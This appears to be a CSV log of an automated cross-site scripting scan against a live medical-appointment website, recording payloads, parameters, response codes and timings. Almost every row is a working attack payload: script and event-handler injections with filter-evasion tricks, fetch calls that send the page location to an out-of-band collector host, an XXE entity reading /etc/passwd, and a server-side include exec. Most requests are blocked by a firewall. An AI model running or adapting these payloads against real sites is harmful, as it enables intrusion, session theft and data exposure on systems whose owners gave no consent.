url,param,payload,server_type,method,response_code,response_time,response_pattern,success,content_snippet,vulnerable,injection_context,nlp_forms_found,nlp_inputs_count,nlp_scripts_found,nlp_has_eval_or_write,nlp_has_sanitization_patterns,nlp_reflected_location_type,fuzz_num_filtered,fuzz_num_encoded
https://www.doctena.com/en-nl/,post_type[],"'; alert(String.fromCharCode(88,83,83))//'; alert(String.fromCharCode(88,83,83))//""; alert(String.fromCharCode(88,83,83))//""; alert(String.fromCharCode(88,83,83))//--&#x3e;&#x3c;/SCRIPT&#x3e;""&#x3e;'; alert(String.fromCharCode(88,83,83))//'; alert(String.fromCharCode(88,83,83))//""; alert(String.fromCharCode(88,83,83))//""; alert(String.fromCharCode(88,83,83))//--&#x3e;&#x3c;/SCRIPT&#x3e;",generic,GET,403,2.0770320892333984,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-nl/,search_limit_to_post_titles,"<iframe src=""javascript:al	ert(1)('XSS')""></iframe>",generic,GET,403,2.063734769821167,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-nl/,add_woo_product_skus,javascript%3Aconfirm%28%22XSS%22%29,generic,GET,403,2.0813379287719727,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-nl/,live_min_character,%3Cscript%3Efetch%28%27//65rpavzptmnd.oast.pro/script%3Floc%3D%27%2Bbtoa%28window.location%29%29%3C/script%3E,generic,GET,403,2.068054437637329,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-lu/,s,"<iMG SRc=x ONERROR=ALERt(""Xss"")>",generic,GET,403,2.0751893520355225,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-nl/,live_posts_per_page,"""><img src=x onerror=alert(""XSS"")>",generic,GET,403,2.067782402038574,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-lu/,post_type[],"<a href=""javascript:eval('alert(\'XSS\')')"">Click Me</a>",generic,GET,403,2.085651159286499,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-nl/,live_search_display_featured_image,%3Cimg%20src%3Dx%20onerror%3Deval%28%22alert%28%27XSS%27%29%22%29%3E,generic,GET,403,2.066373825073242,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-lu/,search_limit_to_post_titles,%3Cscript%3Ealert%281%29%3C/script%3E,generic,GET,403,2.076293706893921,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-nl/,live_search_display_post_type,"<img src=x on/**/error=eval(""alert('XSS')"")>",generic,GET,403,2.0729031562805176,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-lu/,add_woo_product_skus,"<script>al	ert(1)(""XSS"")</script>",generic,GET,403,2.073680877685547,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-nl/,fs,"&#x3c;!--#exec cmd=""/bin/echo '&#x3c;SCR'+'IPT&#x3e;alert(""XSS"")&#x3c;/SCR'+'IPT&#x3e;'""--&#x3e;",generic,GET,403,2.090834379196167,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-ch/,s,%26%23x22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E,generic,GET,403,2.089803695678711,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-ch/,s,"&#x3c;img foo=a onerror=""alert('XSS')""&#x3e;",generic,GET,403,2.0941872596740723,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-lu/,fs,"jAvASCRIpT:EvAl(""aLErT('Xss')"")",generic,GET,403,2.0651156902313232,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-ch/,post_type[],"javascript:eval(""alert('XSS')"")",generic,GET,403,2.135627269744873,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-ch/,post_type[],"<DIV STYLE=""width: expression(al	ert(1)('XSS'));"">",generic,GET,403,2.126821517944336,"<html><head>
	<title>403 Forbidden</title>
	<style>
		html {
			font-family: ""Helvetica Neue"", Helve",0,"<html><head>
	<title>403 Forbidden</title>
	<style>
		html {
			font-family: ""Helvetica Neue"", Helve",0,generic,0,0,1,1,0,none,0,0
https://www.doctena.com/de-ch/,search_limit_to_post_titles,"<a foo=a href=""javascript:alert('XSS')"">Click Me</a>",generic,GET,403,2.057401657104492,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-ch/,search_limit_to_post_titles,"<Img Src=x onerRor=cONfIrM(""xss"")>",generic,GET,403,2.0474565029144287,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-ch/,add_woo_product_skus,"<fORM aCtiON=""JAVAscrIpt:AleRT('Xss')""><iNpUt TYPE=""sUBmIT""></FOrm>",generic,GET,403,2.054175615310669,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-ch/,add_woo_product_skus,<s<Sc<scri pt>ript>alert('XSS')</script>,generic,GET,403,2.0438060760498047,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-ch/,fs,"""><a href=""javascript:al	ert(1)('XSS')"">Click Me</a>",generic,GET,403,2.057307243347168,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-ch/,live_min_character,"<img src=x on/**/error=alert(""XSS"")>",generic,GET,200,6.252201318740845,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,generic,1,7,1,0,0,none,0,0
https://www.doctena.com/de-ch/,live_posts_per_page,"<DIV STYLE=""width: expression(alert('XSS'));"">",generic,GET,403,2.1147799491882324,"<html><head>
	<title>403 Forbidden</title>
	<style>
		html {
			font-family: ""Helvetica Neue"", Helve",0,"<html><head>
	<title>403 Forbidden</title>
	<style>
		html {
			font-family: ""Helvetica Neue"", Helve",0,generic,0,0,1,1,0,none,0,0
https://www.doctena.com/de-ch/,live_search_display_featured_image,%3Cimg%20src%3Dx%20onerror%3Deval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%3E,generic,GET,403,2.047921895980835,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-ch/,live_search_display_post_type,"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/xss.html""></OBJECT>",generic,GET,403,2.067949056625366,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-de/,s,"<img src=""vbscript:al	ert(1)('XSS')"">",generic,GET,403,2.0995185375213623,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-de/,s,%3Ca%20href%3D%22javascript%3Avoid%280%29%22%20onmouseover%3D%22alert%281%29%22%3EClick%20Me%3C/a%3E,generic,GET,403,2.1170077323913574,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-ch/,fs,"<img src=""http://example.com/image.jpg"">",generic,GET,200,3.542131185531616,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,generic,1,7,1,0,0,none,0,0
https://www.doctena.com/en-de/,post_type[],&#x3c;s&#x3c;Sc&#x3c;script&#x3e;ript&#x3e;alert('XSS')&#x3c;/script&#x3e;,generic,GET,403,2.0674636363983154,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-de/,post_type[],"&#x3c;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&#x3e;",generic,GET,403,2.0937821865081787,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-de/,search_limit_to_post_titles,"<a href=""javascript:eval('alert(\'XSS\')')"">Click Me</a>",generic,GET,403,2.05326771736145,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-de/,search_limit_to_post_titles,<s<Sc<script>ript>al	ert(1)('XSS')</script>,generic,GET,403,2.0654187202453613,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-de/,add_woo_product_skus,"&#x3c;!DOCTYPE foo [&#x3c;!ENTITY xxe SYSTEM ""file:///etc/passwd""&#x3e;]&#x3e;&#x3c;foo&#x3e;&xxe;&#x3c;/foo&#x3e;",generic,GET,403,2.0742440223693848,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-de/,add_woo_product_skus,"<a href=""javascript:void(0)"" onmouseover=""al	ert(1)(1)"">Click Me</a>",generic,GET,403,2.0678861141204834,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-de/,fs,"<img sRc=x ONerroR=eVAl(strinG.FROMchARcODE(97,108,101,114,116,40,49,41))>",generic,GET,403,2.058832883834839,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-de/,live_min_character,%3COBJECT%20TYPE%3D%22text/x-scriptlet%22%20DATA%3D%22http%3A//ha.ckers.org/xss.html%22%3E%3C/OBJECT%3E,generic,GET,403,2.0789341926574707,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-de/,live_posts_per_page,"""&#x3e;&#x3c;script&#x3e;alert(""XSS"")&#x3c;/script&#x3e;",generic,GET,403,2.0778419971466064,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-de/,live_search_display_featured_image,%3CSWF%3E%3CPARAM%20NAME%3Dmovie%20VALUE%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C/PARAM%3E%3Cembed%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C/embed%3E%3C/SWF%3E,generic,GET,403,2.0697948932647705,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-at/,s,"&#x3c;img foo=a src=""javascript:alert('XSS')""&#x3e;",generic,GET,403,2.074570417404175,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-de/,live_search_display_post_type,&#34;><img src=x onerror=al	ert(1)('XSS')>,generic,GET,403,2.067589282989502,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-at/,post_type[],"&#x3c;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&#x3e;",generic,GET,403,2.0625834465026855,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-de/,fs,javascript%3Aalert%28%22XSS%22%29,generic,GET,403,2.067051649093628,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-at/,search_limit_to_post_titles,%22%3E%3Ca%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E,generic,GET,403,2.068877935409546,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-at/,add_woo_product_skus,<svg/onload=fetch('//65rpavzptmnd.oast.pro/svg?loc='+btoa(window.location))>,generic,GET,403,2.0803849697113037,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-at/,fs,<svg><p><style><img src=1 href=1 on/**/error=alert(1)></p></svg>,generic,GET,403,2.241591691970825,"<html><head>
	<title>403 Forbidden</title>
	<style>
		html {
			font-family: ""Helvetica Neue"", Helve",0,"<html><head>
	<title>403 Forbidden</title>
	<style>
		html {
			font-family: ""Helvetica Neue"", Helve",0,generic,0,0,1,1,0,none,0,0
https://www.doctena.com/fr-lu/,s,"'; ALERT(stRiNG.froMChARCoDE(88,83,83))//'; aLERt(striNg.FrOMCHARCodE(88,83,83))//""; alerT(striNg.FrOmCHARcoDe(88,83,83))//""; aleRT(StrINg.fRoMchaRCODe(88,83,83))//--></Script>"">'; ALERt(stRINg.frOMChARCODE(88,83,83))//'; aLert(sTring.frOMCHARcODE(88,83,83))//""; AleRT(striNg.fRomchARCoDE(88,83,83))//""; ALErt(sTRinG.FRoMcHArCodE(88,83,83))//--></ScRipt>",generic,GET,403,2.162858486175537,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-lu/,post_type[],"&#x3c;style&#x3e;li {list-style-image: url(""javascript:alert('XSS')"");}&#x3c;/style&#x3e;&#x3c;ul&#x3e;&#x3c;li&#x3e;&#x3c;/ul&#x3e;",generic,GET,403,2.0479562282562256,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
